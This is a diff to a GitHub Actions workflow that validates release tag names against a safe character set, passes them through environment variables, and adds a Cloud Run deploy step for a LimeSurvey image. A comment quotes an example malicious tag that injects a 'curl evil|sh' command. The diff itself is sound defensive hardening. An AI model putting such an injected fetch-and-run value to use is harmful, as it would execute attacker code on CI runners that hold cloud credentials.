@@ -22,14 +22,51 @@ jobs:
         with:
           credentials_json: '${{ secrets.GOOGLE_APPLICATION_CREDENTIALS }}'
 
+      # Tag names are user-controlled, so they are passed through the environment and never
+      # interpolated into a `run:` script with ${{ }} (that would let a crafted tag such as
+      # `v1";curl evil|sh;"` execute in the runner). Also validated to a safe charset here.
+      # `set-output` was replaced with $GITHUB_OUTPUT — the old form is deprecated.
       - name: Extract tag name
         id: get_tag
-        run: echo "::set-output name=TAG::${GITHUB_REF#refs/tags/}"
+        run: |
+          TAG="${GITHUB_REF#refs/tags/}"
+          if ! printf '%s' "$TAG" | grep -qE '^[A-Za-z0-9._-]+$'; then
+            echo "Refusing to build: tag '$TAG' contains unexpected characters." >&2
+            exit 1
+          fi
+          echo "TAG=$TAG" >> "$GITHUB_OUTPUT"
 
       - name: Build and push the docker image
         env:
           GOOGLE_PROJECT: ${{ secrets.GOOGLE_PROJECT }}
+          TAG: ${{ steps.get_tag.outputs.TAG }}
         run: |
           gcloud auth configure-docker europe-west1-docker.pkg.dev
-          docker build -t europe-west1-docker.pkg.dev/$GOOGLE_PROJECT/air-tools/limesurvey:${{ steps.get_tag.outputs.TAG }} .
-          docker push europe-west1-docker.pkg.dev/$GOOGLE_PROJECT/air-tools/limesurvey:${{ steps.get_tag.outputs.TAG }}
+          IMAGE="europe-west1-docker.pkg.dev/${GOOGLE_PROJECT}/air-tools/limesurvey:${TAG}"
+          docker build -t "$IMAGE" .
+          docker push "$IMAGE"
+
+      # Enforce the whole service spec from source, THEN roll the new image — same intent
+      # as the old GKE step (config must not drift), now against Cloud Run.
+      #
+      # service.yaml pins an immutable digest for manual deploys; here we substitute the
+      # freshly pushed tag so spec + image land in ONE revision. The image is pushed in the
+      # step above, so the tag exists before this runs — deploying against a not-yet-pushed
+      # tag makes Cloud Run cache an "image not found" failure on a revision name it then
+      # reuses, and the latest revision cannot be deleted.
+      #
+      # Requires the deploy SA to have roles/run.admin, plus roles/iam.serviceAccountUser
+      # on limesurvey-run@ (to act as the service's runtime identity).
+      - name: Deploy to Cloud Run
+        env:
+          GOOGLE_PROJECT: ${{ secrets.GOOGLE_PROJECT }}
+          TAG: ${{ steps.get_tag.outputs.TAG }}
+        run: |
+          IMAGE="europe-west1-docker.pkg.dev/${GOOGLE_PROJECT}/air-tools/limesurvey:${TAG}"
+          sed -i -E "s#^(\s*)image: europe-west1-docker\.pkg\.dev/.*/limesurvey[@:].*#\1image: ${IMAGE}#" \
+            deploy/cloudrun/service.yaml
+          grep -n "image: .*limesurvey" deploy/cloudrun/service.yaml
+          gcloud run services replace deploy/cloudrun/service.yaml \
+            --region europe-west1 --project "$GOOGLE_PROJECT"
+          gcloud run services describe limesurvey --region europe-west1 \
+            --project "$GOOGLE_PROJECT" --format='value(status.latestReadyRevisionName)'
